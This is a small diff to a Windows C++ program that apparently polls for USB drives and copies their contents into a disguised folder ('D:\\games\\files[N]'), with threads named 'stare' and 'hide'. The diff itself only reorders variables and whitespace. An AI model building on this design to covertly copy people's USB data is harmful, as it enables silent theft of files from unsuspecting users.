@@ -7,18 +7,17 @@
 #include <algorithm>
 using namespace std;
 
-unsigned char i;
 bool active;
 int usbnums;
+unsigned char i;
+char usbname[20];
 char src[20] = "X:\\";
 char dest[20] = "D:\\games\\files[X]\\";
 char dest0[20] = "D:\\games\\files[0]\\";
-char usbname[20];
 vector<string> usbnames;
 
 HANDLE hthread_stare = NULL;
 HANDLE hthread_hide = NULL;
-HANDLE husb = NULL;
 UINT DiskType;
 
 /*-------------------------------------------------------------------------------------------
@@ -33,7 +32,8 @@ int main() {
 
 	usbnums = 0;
 
-	while (true) {				
+	while (true) {			
+		
 		sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
 		if (checkusb()) {
 			active = true;
@@ -53,7 +53,7 @@ int main() {
 		} else {
 			Sleep(5000);
 		}
-			
+		
 	}
 	return 0;
 }
